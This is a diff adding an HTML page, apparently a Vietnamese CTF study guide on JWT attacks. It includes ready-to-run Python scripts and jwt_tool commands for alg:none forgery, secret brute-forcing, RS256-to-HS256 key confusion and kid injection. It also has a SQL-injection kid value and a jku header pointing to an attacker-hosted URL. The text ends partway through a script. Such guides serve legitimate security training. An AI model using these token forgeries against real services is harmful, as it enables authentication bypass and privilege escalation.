@@ -1,0 +1,589 @@
+<title>JWT Attacks — Web CTF</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#ecebe4;--fg:#23211c;--muted:#6b665b;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--danger:#c0392b;--burp:#c2561a;--burp-soft:#f6e2d2;
+  --code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:760px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.62;font-size:16px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:40px 24px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,42px);line-height:1.05;margin:.3em 0 .25em;letter-spacing:-.015em}
+.sub{color:var(--muted);font-size:17px;max-width:62ch}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+.toc a{font-family:var(--font-mono);font-size:11px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 8px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(20px,4vw,26px);letter-spacing:-.01em;margin:0 0 2px}
+h3{font-family:var(--font-head);font-weight:600;font-size:16.5px;margin:20px 0 6px}
+section.block{padding-block:28px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:10px 0}strong{font-weight:600}a{color:var(--accent)}
+ul,ol{padding-left:21px;margin:9px 0}li{margin:5px 0}
+code{font-family:var(--font-mono);font-size:.86em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:12.5px;line-height:1.56;padding:14px;border-radius:11px;overflow-x:auto;margin:10px 0}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .n{color:#e8c56a}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}
+tr:last-child td{border-bottom:none}
+.lead{font-size:17.5px}
+.twolayer{display:flex;flex-direction:column;gap:0;border-radius:14px;overflow:hidden;border:1px solid var(--line);margin:16px 0}
+.layer{padding:14px 16px}
+.layer.combat{background:var(--accent-soft);border-bottom:2px dashed var(--accent)}
+.layer.deep{background:var(--mem-soft)}
+.layer .lh{font-family:var(--font-head);font-weight:700;font-size:15px;display:flex;align-items:center;gap:7px;margin-bottom:3px}
+.layer.combat .lh{color:var(--accent)}.layer.deep .lh{color:var(--mem)}
+.layer p{margin:3px 0 0;font-size:14px}
+.note{border-left:3px solid var(--mem);background:var(--surface);padding:11px 14px;border-radius:0 10px 10px 0;margin:14px 0;font-size:14px}
+.note .tag{font-family:var(--font-mono);font-size:10.5px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.note.tip{border-color:var(--ok)}
+.note.warn{border-color:var(--danger)}
+.note.burp{border-color:var(--burp);background:var(--burp-soft)}
+.note.burp .tag{color:var(--burp)}
+.def{border:1px dashed var(--mem);background:var(--mem-soft);border-radius:10px;padding:10px 13px;margin:10px 0;font-size:13.5px}
+.def b{color:var(--mem)}
+.struct{display:flex;flex-direction:column;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:12px 0}
+.srow{display:grid;grid-template-columns:30px 1fr;gap:10px;padding:10px 13px;background:var(--surface)}
+.srow .n{font-family:var(--font-mono);font-weight:700;color:var(--accent);font-size:13px}
+.srow .t{font-weight:600;font-size:14px}
+.srow .d{font-size:12.5px;color:var(--muted);margin-top:1px}
+.combatcard{border:2px solid var(--accent);border-radius:12px;overflow:hidden;margin:14px 0}
+.combatcard .ch{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:8px 14px;font-size:14px}
+.combatcard .cb{padding:4px 14px 10px}
+.cslot{padding:10px 0;border-bottom:1px solid var(--line);font-size:13.5px}
+.cslot:last-child{border-bottom:none}
+.cslot .lab{font-family:var(--font-mono);font-size:10.5px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:4px}
+.pbreak{border:1px solid var(--line);border-radius:11px;overflow:hidden;margin:12px 0}
+.pbreak .ph{background:var(--surface-2);font-family:var(--font-mono);font-size:12.5px;padding:9px 13px;border-bottom:1px solid var(--line);word-break:break-word}
+.pbreak .pb{padding:10px 13px;font-size:13.5px}
+.pbreak .pb .part{margin:6px 0}
+.pbreak .pb .part code{background:var(--accent-soft);color:var(--accent);font-weight:600}
+.pbreak .resp{background:var(--ok-soft);padding:9px 13px;font-size:13px;border-top:1px dashed var(--line)}
+.pbreak .resp b{color:var(--ok)}
+.svgwrap{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:12px;margin:14px 0}
+.svgwrap svg{width:100%;height:auto;display:block}
+details{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:9px 13px;margin:8px 0;font-size:13.5px}
+summary{cursor:pointer;font-weight:600;color:var(--accent)}
+.badge{display:inline-block;font-family:var(--font-mono);font-size:11px;padding:2px 8px;border-radius:999px;font-weight:700}
+.badge.easy{background:var(--ok-soft);color:var(--ok)}
+.badge.med{background:var(--accent-soft);color:var(--accent)}
+.badge.hard{background:color-mix(in srgb,var(--danger) 16%,transparent);color:var(--danger)}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer;opacity:.9}
+footer{padding-block:22px 40px;color:var(--muted);font-size:13px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">Web CTF · Auth, Session &amp; Crypto</div>
+    <h1>JWT Attacks</h1>
+    <p class="sub">JWT (JSON Web Token) là cách phổ biến để lưu "tôi là ai, quyền gì" trong 1 chuỗi mà trình duyệt
+    tự gửi lại mỗi request, có chữ ký để chống giả mạo. Khi server <strong>cấu hình/kiểm tra chữ ký sai</strong>,
+    bạn có thể tự sửa nội dung token (đổi role thành admin, đổi user_id) mà server vẫn tin là hợp lệ.</p>
+    <div class="toc">
+      <a href="#combat">⚡ Combat</a><a href="#s00">00 Tóm tắt</a><a href="#s01">01 Nền tảng</a>
+      <a href="#s02">02 Vì sao</a><a href="#s03">03 Cơ chế</a><a href="#s04">04 Nhận diện</a>
+      <a href="#s05">05 Burp</a><a href="#s06">06 Payload</a><a href="#s07">07 Công cụ</a>
+      <a href="#s08">08 Script</a><a href="#s09">09 Ví dụ</a><a href="#s10">10 WAF</a>
+      <a href="#s11">11 Lỗi gặp</a><a href="#s12">12 Giới hạn</a><a href="#s13">13 Bài tập</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s00">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>JWT là gì, tấn công nó để làm gì?</h2>
+  <p class="lead">Thay vì server tự nhớ "ai đang đăng nhập" (session lưu ở server), nhiều app hiện đại gói thông
+  tin đó vào 1 chuỗi gọi là <strong>JWT</strong>, gửi cho trình duyệt giữ, trình duyệt tự gửi lại mỗi request.
+  Để server tin được JWT chưa bị sửa, nó có <strong>chữ ký số</strong> đi kèm. Nếu việc kiểm tra chữ ký bị cấu
+  hình sai (chấp nhận "không chữ ký", hoặc dùng sai loại khóa để verify, hoặc khóa quá yếu để đoán ra), bạn có
+  thể tự sửa nội dung bên trong (đổi <code>role: "user"</code> thành <code>role: "admin"</code>) rồi tự tạo chữ
+  ký mới mà server vẫn chấp nhận.</p>
+  <div class="note tip"><span class="tag">Nếu chỉ nhớ một điều</span>
+  JWT luôn có dạng <code>xxxxx.yyyyy.zzzzz</code> (3 phần ngăn bởi dấu chấm, mỗi phần là Base64). Phần giữa
+  (payload) <strong>ai cũng đọc được</strong> chỉ bằng decode Base64, không cần biết khóa bí mật — JWT
+  <strong>không mã hóa</strong>, chỉ <strong>ký</strong>. Việc tấn công là tìm cách sửa phần giữa mà vẫn qua được
+  bước kiểm tra chữ ký ở phần cuối.</div>
+ </div>
+</section>
+
+<!-- COMBAT CARD -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="secnum">⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay</div>
+  <div class="combatcard">
+    <div class="ch">⚡ JWT ATTACKS</div>
+    <div class="cb">
+      <div class="cslot"><span class="lab">🚩 Nhận ra trong 30 giây</span>
+        Cookie hoặc header <code>Authorization: Bearer</code> có chuỗi dạng <code>eyJ...</code> (luôn bắt đầu
+        <code>eyJ</code> vì đó là Base64 của <code>{"</code>). Decode phần giữa bằng Base64 để xem claim bên
+        trong (vd <code>role</code>, <code>user_id</code>, <code>is_admin</code>).
+      </div>
+      <div class="cslot"><span class="lab">✅ Tiền đề cần có</span>
+        Có 1 token hợp lệ bất kỳ (đăng nhập tài khoản thường để lấy). Biết tên claim cần sửa (thường đoán được:
+        <code>role</code>, <code>admin</code>, <code>is_admin</code>, <code>user_id</code>).
+      </div>
+      <div class="cslot"><span class="lab">🔍 Dò nhanh bằng jwt_tool</span>
+        <code>python3 jwt_tool.py &lt;token&gt;</code> — tự phân tích, liệt kê các hướng tấn công có thể thử ngay
+        (xem mục 07).
+      </div>
+      <div class="cslot"><span class="lab">💥 Payload dán-chạy-ngay (thử theo thứ tự)</span>
+<pre><code><span class="c"># 1. alg:none — bỏ chữ ký hoàn toàn</span>
+header: {"alg":"none","typ":"JWT"}
+-&gt; token = base64(header).base64(payload đã sửa).(để trống phần chữ ký)
+
+<span class="c"># 2. weak secret — brute-force bằng wordlist</span>
+python3 jwt_tool.py &lt;token&gt; -C -d jwt-common.txt
+
+<span class="c"># 3. kid injection — kid trỏ file có nội dung biết trước</span>
+header: {"alg":"HS256","kid":"../../../../dev/null"}
+-&gt; ký bằng secret = "" (nội dung /dev/null là rỗng)</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">🐍 Script khai thác (điền host, chạy)</span>
+<pre><code><span class="k">import</span> jwt, requests
+
+<span class="c"># Giả sử đã brute-force được secret = "secret123"</span>
+new_token = jwt.encode({<span class="s">"user"</span>: <span class="s">"admin"</span>, <span class="s">"role"</span>: <span class="s">"admin"</span>}, <span class="s">"secret123"</span>, algorithm=<span class="s">"HS256"</span>)
+r = requests.get(<span class="s">"http://TARGET/admin/flag"</span>, headers={<span class="s">"Authorization"</span>: <span class="s">f"Bearer {new_token}"</span>})
+<span class="k">print</span>(r.text)</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">⚠️ Gotcha + 🛡️ WAF 1 dòng</span>
+        <code>alg:none</code> hay bị chặn bởi thư viện JWT mới — thử tiếp <strong>key confusion RS256→HS256</strong>
+        (mục 06). WAF rule nhanh: chặn token có header chứa <code>"alg":"none"</code> (base64-decode header trước
+        khi so khớp — khó làm bằng regex thuần, cần logic xử lý riêng). Chưa hiểu? đọc tiếp dưới.
+      </div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s01">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Cấu trúc JWT — 3 phần</h2>
+  <div class="def"><b>JWT (JSON Web Token)</b> — chuỗi dạng <code>header.payload.signature</code>, mỗi phần là
+  JSON được mã hóa Base64 (biến thể URL-safe), ngăn cách bởi dấu chấm.</div>
+  <table>
+    <tr><th>Phần</th><th>Nội dung</th><th>Ví dụ sau decode</th></tr>
+    <tr><td><b>Header</b></td><td>Thuật toán ký + loại token</td><td><code>{"alg":"HS256","typ":"JWT"}</code></td></tr>
+    <tr><td><b>Payload (claims)</b></td><td>Dữ liệu thật — thông tin user, quyền, thời hạn</td><td><code>{"user_id":17,"role":"user","exp":1234567890}</code></td></tr>
+    <tr><td><b>Signature</b></td><td>Chữ ký — tính từ header+payload và 1 khóa bí mật, để server xác minh token chưa bị sửa</td><td><code>HMACSHA256(base64(header)+"."+base64(payload), secret)</code></td></tr>
+  </table>
+  <div class="note warn"><span class="tag">Quan trọng — khác với session cookie</span>Header và payload
+  <strong>KHÔNG được mã hóa</strong>, chỉ encode Base64 — tức là <strong>ai cũng đọc được nội dung</strong>, chỉ
+  không <em>sửa được mà không bị phát hiện</em> (vì chữ ký sẽ sai). Vậy tấn công JWT không phải "giải mã xem có
+  gì", mà là "tìm cách sửa nội dung mà vẫn qua được bước kiểm tra chữ ký".</div>
+  <div class="def"><b>HS256 vs RS256</b> — hai thuật toán ký phổ biến. <code>HS256</code> (symmetric): ký và kiểm
+  tra dùng <strong>chung 1 khóa bí mật</strong> (chỉ server biết). <code>RS256</code> (asymmetric): ký bằng
+  <strong>private key</strong> (chỉ server có), kiểm tra bằng <strong>public key</strong> (thường công khai, đôi
+  khi lộ qua endpoint <code>/.well-known/jwks.json</code>).</div>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s02">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO LỖ HỔNG TỒN TẠI</div>
+  <h2>Thư viện verify cho phép quá nhiều lựa chọn</h2>
+  <p>Chuẩn JWT (JWS) hỗ trợ <strong>nhiều thuật toán ký</strong>, kể cả thuật toán <code>none</code> (không ký —
+  dùng cho mục đích test/debug, lẽ ra không nên bật ở production). Vấn đề nằm ở chỗ: <strong>thuật toán dùng để
+  ký KHÔNG CỐ ĐỊNH, mà được ghi ngay trong header của chính token</strong> — và nhiều thư viện verify (đặc biệt
+  bản cũ) <strong>tin tưởng mù quáng</strong> giá trị <code>alg</code> trong header do chính người gửi token
+  cung cấp, thay vì server tự cố định 1 thuật toán duy nhất và chỉ chấp nhận đúng nó.</p>
+  <p>Đây là lỗi logic kinh điển: <strong>để người dùng tự chọn phương thức bảo mật áp dụng cho chính dữ liệu của
+  họ</strong> — tương tự việc để khách tự chọn "có kiểm tra vé hay không" khi vào rạp.</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s03">
+ <div class="wrap">
+  <div class="secnum">03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI</div>
+  <h2>Key Confusion: biến RS256 thành HS256</h2>
+  <div class="svgwrap">
+  <svg viewBox="0 0 680 230" xmlns="http://www.w3.org/2000/svg">
+    <style>
+      .lbl{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--fg)}
+      .lbl-m{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--muted)}
+      .lbl-a{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--accent);font-weight:700}
+      .box{fill:var(--surface);stroke:var(--line);stroke-width:1.5}
+      .box-a{fill:var(--accent-soft);stroke:var(--accent);stroke-width:1.5}
+      .arrow{stroke:var(--muted);stroke-width:1.5;fill:none;marker-end:url(#arr8)}
+    </style>
+    <defs><marker id="arr8" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+      <path d="M0,0 L6,3 L0,6 Z" fill="var(--muted)"/></marker></defs>
+    <text x="10" y="18" class="lbl-m">Bình thường: server dùng public key để VERIFY token RS256 (ký bằng private key)</text>
+    <rect x="10" y="30" width="300" height="50" rx="10" class="box"/>
+    <text x="22" y="48" class="lbl-m">verify(token, public_key,</text>
+    <text x="22" y="62" class="lbl">algorithms=["RS256"])</text>
+
+    <text x="10" y="110" class="lbl-m">Tấn công: tự ký lại bằng HS256, DÙNG CHÍNH public key làm "secret"</text>
+    <rect x="10" y="122" width="300" height="50" rx="10" class="box-a"/>
+    <text x="22" y="140" class="lbl-m">sign(payload đã sửa,</text>
+    <text x="22" y="154" class="lbl-a">secret = public_key, alg=HS256)</text>
+
+    <path d="M310,147 H348" class="arrow"/>
+    <rect x="353" y="122" width="300" height="60" rx="10" class="box-a"/>
+    <text x="365" y="140" class="lbl-m">Thư viện verify() lỏng lẻo:</text>
+    <text x="365" y="154" class="lbl">tin header alg=HS256, tự lấy</text>
+    <text x="365" y="168" class="lbl-a">"public_key" làm secret để check HMAC</text>
+  </svg>
+  </div>
+  <p>Giải thích vì sao cách này hoạt động: thư viện verify ở server thường viết kiểu
+  <code>verify(token, key)</code>, dùng <strong>chung 1 tham số <code>key</code></strong> cho cả HS256
+  (coi là secret) lẫn RS256 (coi là public key). Nếu code server không <strong>ép cứng</strong> thuật toán phải
+  là RS256 (mà đọc <code>alg</code> từ chính token để quyết định cách verify), kẻ tấn công chỉ cần:</p>
+  <div class="pbreak">
+    <div class="ph">1. Lấy public key (thường lộ qua /.well-known/jwks.json hoặc endpoint tương tự)
+2. Sửa payload: role=admin
+3. Đổi header alg: RS256 → HS256
+4. Ký lại bằng HMAC-SHA256, dùng CHÍNH NỘI DUNG public key (dạng PEM text) làm secret key</div>
+    <div class="pb">
+      <div class="part">Server nhận token mới, thấy header ghi <code>alg: HS256</code>, tự động lấy biến
+      <code>key</code> nó đang có sẵn (vốn là public key RSA, nhưng giờ bị coi như secret HMAC) để verify chữ ký
+      HMAC — và vì bạn vừa ký bằng đúng chuỗi đó, chữ ký khớp!</div>
+    </div>
+    <div class="resp"><b>Kết quả:</b> server tin token đã sửa (role=admin) là hợp lệ, dù bạn không hề biết secret
+    thật — vì chữ ký HS256 hợp lệ không cần secret thật, chỉ cần verify dùng đúng chuỗi bạn vừa ký.</div>
+  </div>
+ </div>
+</section>
+
+<!-- 04 -->
+<section class="block" id="s04">
+ <div class="wrap">
+  <div class="secnum">04 / NHẬN DIỆN KHI GẶP CHALLENGE</div>
+  <h2>Bảng dấu hiệu</h2>
+  <table>
+    <tr><th>Dấu hiệu quan sát được</th><th>Ý nghĩa</th></tr>
+    <tr><td>Cookie/header chứa chuỗi bắt đầu <code>eyJ</code></td><td>Chắc chắn là JWT (hoặc base64 của JSON tương tự)</td></tr>
+    <tr><td>Decode payload thấy claim <code>role</code>/<code>is_admin</code>/<code>permissions</code></td><td>Mục tiêu rõ ràng để thử sửa</td></tr>
+    <tr><td>Header có <code>"alg":"RS256"</code> + app có endpoint <code>/jwks.json</code> hoặc lộ public key</td><td>Khả năng Key Confusion (mục 03)</td></tr>
+    <tr><td>Header có trường <code>kid</code> (key ID)</td><td>Khả năng <code>kid</code> injection (mục 06)</td></tr>
+    <tr><td>Secret ngắn/dễ đoán (app CTF tự dựng nhanh, có thể dùng secret kiểu "secret", "123456")</td><td>Thử brute-force bằng wordlist trước khi nghĩ tới kỹ thuật phức tạp hơn</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 05 -->
+<section class="block" id="s05">
+ <div class="wrap">
+  <div class="secnum">05 / KHAI THÁC BẰNG BURP SUITE</div>
+  <h2>Bấm gì (từng bước)</h2>
+  <div class="note burp"><span class="tag">Dùng extension JWT Editor (cần cài trước ngày thi)</span>
+  <ol style="margin:4px 0 0">
+    <li>Cài extension <strong>JWT Editor</strong> từ BApp Store (cần Internet — làm trước ngày thi).</li>
+    <li>Bắt request có header <code>Authorization: Bearer eyJ...</code>, Send to Repeater.</li>
+    <li>Burp tự nhận diện và hiện tab <strong>JSON Web Token</strong> ngay trong Repeater — sửa trực tiếp claim
+    dạng form thay vì tự tay encode/decode Base64.</li>
+    <li>Dùng menu <strong>Attack</strong> trong tab đó để thử nhanh "Sign with none algorithm", "Embedded JWK"...</li>
+  </ol></div>
+  <div class="note burp"><span class="tag">Không có extension — làm thủ công</span>
+  <ol style="margin:4px 0 0">
+    <li>Copy token ra ngoài, tách 3 phần theo dấu chấm.</li>
+    <li>Base64-decode (URL-safe) phần header và payload bằng CyberChef (mục 07) hoặc Python.</li>
+    <li>Sửa JSON, encode lại Base64 (URL-safe, <strong>bỏ padding <code>=</code></strong> — JWT chuẩn không
+    dùng padding).</li>
+    <li>Ghép lại <code>header.payload.signature_mới</code>, dán vào Repeater, Send.</li>
+  </ol></div>
+ </div>
+</section>
+
+<!-- 06 -->
+<section class="block" id="s06">
+ <div class="wrap">
+  <div class="secnum">06 / PAYLOAD ĐẦY ĐỦ THEO KỸ THUẬT</div>
+  <h2>Thử theo thứ tự ưu tiên</h2>
+
+  <h3>A. alg: none <span class="badge easy">thử trước, nhanh nhất</span></h3>
+  <pre><code><span class="k">import</span> base64, json
+
+header = {<span class="s">"alg"</span>: <span class="s">"none"</span>, <span class="s">"typ"</span>: <span class="s">"JWT"</span>}
+payload = {<span class="s">"user"</span>: <span class="s">"admin"</span>, <span class="s">"role"</span>: <span class="s">"admin"</span>}
+
+<span class="k">def</span> <span class="d">b64url</span>(d):
+    <span class="k">return</span> base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(<span class="s">b"="</span>).decode()
+
+token = <span class="s">f"{b64url(header)}.{b64url(payload)}."</span>   <span class="c"># phần chữ ký để TRỐNG</span>
+<span class="k">print</span>(token)</code></pre>
+  <div class="note">Một số thư viện cũ chấp nhận cả biến thể viết hoa <code>"None"</code>, <code>"NONE"</code>
+  nếu bị chặn đúng chữ <code>none</code> thường.</div>
+
+  <h3>B. Weak secret (HS256) — brute-force</h3>
+  <p>Xem mục 07 (jwt_tool) — đây là kỹ thuật cần công cụ, không nên tự brute-force bằng tay.</p>
+
+  <h3>C. Key Confusion RS256 → HS256 <span class="badge med">cần public key</span></h3>
+  <pre><code><span class="k">import</span> jwt
+
+<span class="c"># public_key: dán nguyên văn PEM lấy được từ /.well-known/jwks.json hoặc endpoint lộ public key</span>
+public_key = <span class="s">"""-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
+-----END PUBLIC KEY-----"""</span>
+
+new_token = jwt.encode({<span class="s">"user"</span>: <span class="s">"admin"</span>, <span class="s">"role"</span>: <span class="s">"admin"</span>},
+        public_key, algorithm=<span class="s">"HS256"</span>)   <span class="c"># dùng public key LÀM secret HMAC</span>
+<span class="k">print</span>(new_token)</code></pre>
+
+  <h3>D. kid injection — khi header có trường <code>kid</code></h3>
+  <table>
+    <tr><th>Biến thể</th><th>Payload header</th></tr>
+    <tr><td>Path traversal trỏ file rỗng/biết nội dung</td><td><code>{"alg":"HS256","kid":"../../../../dev/null"}</code> → ký bằng secret rỗng</td></tr>
+    <tr><td>SQL injection trong kid (nếu server tra khóa từ DB theo kid)</td><td><code>{"kid":"' UNION SELECT 'mysecret"}</code> → server tự "trả về" secret do bạn chọn</td></tr>
+    <tr><td>Trỏ tới URL do bạn host (jku/x5u, nếu app hỗ trợ)</td><td><code>{"jku":"http://YOUR_IP/evil-jwks.json"}</code> — cần listener trong mạng thi</td></tr>
+  </table>
+
+  <h3>E. Sửa claim đơn giản (khi token đã dùng alg:none hoặc bạn đã có secret)</h3>
+  <table>
+    <tr><th>Claim hay gặp</th><th>Sửa thành</th></tr>
+    <tr><td><code>role: "user"</code></td><td><code>"admin"</code></td></tr>
+    <tr><td><code>is_admin: false</code></td><td><code>true</code></td></tr>
+    <tr><td><code>user_id: 17</code></td><td>ID của nạn nhân/admin (kết hợp IDOR)</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 07 -->
+<section class="block" id="s07">
+ <div class="wrap">
+  <div class="secnum">07 / CÔNG CỤ THỰC CHIẾN: JWT_TOOL &amp; CYBERCHEF</div>
+  <h2>Không nhớ nổi cách build token tay? Dùng công cụ</h2>
+
+  <h3>A. jwt_tool — tự động dò và khai thác (tương đương sqlmap cho JWT)</h3>
+  <div class="def"><b>jwt_tool</b> — công cụ chuyên biệt: phân tích token, tự thử <code>alg:none</code>,
+  brute-force secret bằng wordlist, test key confusion, tạo token giả. Đã clone về
+  <code>~/hoc/CTF/Tools/web/jwt_tool/</code> (từ <code>ticarpi/jwt_tool</code> chính chủ, 6800+ sao), kèm sẵn wordlist
+  secret phổ biến (<code>jwt-common.txt</code>).</div>
+  <pre><code>cd ~/hoc/CTF/Tools/web/jwt_tool
+
+<span class="c"># Phân tích token, liệt kê hướng tấn công khả thi</span>
+python3 jwt_tool.py <span class="s">"eyJhbGciOiJIUzI1NiJ9...TOKEN_CUA_BAN"</span>
+
+<span class="c"># Thử alg:none tự động</span>
+python3 jwt_tool.py <span class="s">"TOKEN"</span> -X a
+
+<span class="c"># Brute-force secret bằng wordlist có sẵn</span>
+python3 jwt_tool.py <span class="s">"TOKEN"</span> -C -d jwt-common.txt
+
+<span class="c"># Sau khi có secret, tạo token mới với claim tự chọn</span>
+python3 jwt_tool.py <span class="s">"TOKEN"</span> -T -S hs256 -p <span class="s">"secret_da_tim_duoc"</span></code></pre>
+  <table>
+    <tr><th>Flag</th><th>Ý nghĩa</th></tr>
+    <tr><td><code>-X a</code></td><td>Tự động thử tấn công <code>alg:none</code></td></tr>
+    <tr><td><code>-C</code></td><td>Bật chế độ brute-force (crack) secret</td></tr>
+    <tr><td><code>-d wordlist</code></td><td>Wordlist dùng để brute-force (đã có sẵn <code>jwt-common.txt</code>)</td></tr>
+    <tr><td><code>-T</code></td><td>Chế độ tạo/sửa token (tamper) tương tác</td></tr>
+    <tr><td><code>-S hs256 -p secret</code></td><td>Ký lại token bằng HS256 với secret đã biết</td></tr>
+  </table>
+
+  <h3>B. CyberChef — decode/encode JWT nhanh không cần công cụ ngoài</h3>
+  <p>Mở <code>~/hoc/CTF/Tools/web/CyberChef/CyberChef_v11.6.0.html</code>. CyberChef có sẵn khối
+  <strong>JWT Decode</strong> (dán token vào, đọc ngay header+payload mà không cần tự tách chuỗi/base64 tay) và
+  <strong>JWT Sign</strong> (khi đã biết secret, điền claim mới, tự sinh token đã ký — nhanh hơn viết script cho
+  việc thử nhanh 1-2 lần).</p>
+ </div>
+</section>
+
+<!-- 08 -->
+<section class="block" id="s08">
+ <div class="wrap">
+  <div class="secnum">08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)</div>
+  <h2>Từ tay-gõ-Burp sang script tự động</h2>
+  <div class="note"><span class="tag">Cần cài thư viện</span>Các script dưới dùng <code>pip install pyjwt</code>
+  — cài sẵn trước ngày thi (không có Internet trong phòng thi).</div>
+
+  <h3>(A) Bản thủ công — để HIỂU từng bước (alg:none)</h3>
+  <pre><code><span class="k">import</span> base64, json, requests
+
+<span class="k">def</span> <span class="d">b64url</span>(d):
+    <span class="k">return</span> base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(<span class="s">b"="</span>).decode()
+
+header = {<span class="s">"alg"</span>: <span class="s">"none"</span>, <span class="s">"typ"</span>: <span class="s">"JWT"</span>}
+payload = {<span class="s">"user"</span>: <span class="s">"admin"</span>, <span class="s">"role"</span>: <span class="s">"admin"</span>}
+token = <span class="s">f"{b64url(header)}.{b64url(payload)}."</span>
+
+r = requests.get(<span class="s">"http://TARGET/admin/flag"</span>, headers={<span class="s">"Authorization"</span>: <span class="s">f"Bearer {token}"</span>})
+<span class="k">print</span>(r.text)</code></pre>
+
+  <h3>(B) Bản gọn chắc — dùng thực chiến (sau khi đã biết secret), trích thẳng flag</h3>
+  <pre><code><span class="k">import</span> re, jwt, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+SECRET = <span class="s">"secret_da_brute_force_duoc"</span>
+
+<span class="k">def</span> <span class="d">exploit_jwt</span>(host):
+    token = jwt.encode({<span class="s">"user"</span>: <span class="s">"admin"</span>, <span class="s">"role"</span>: <span class="s">"admin"</span>}, SECRET, algorithm=<span class="s">"HS256"</span>)
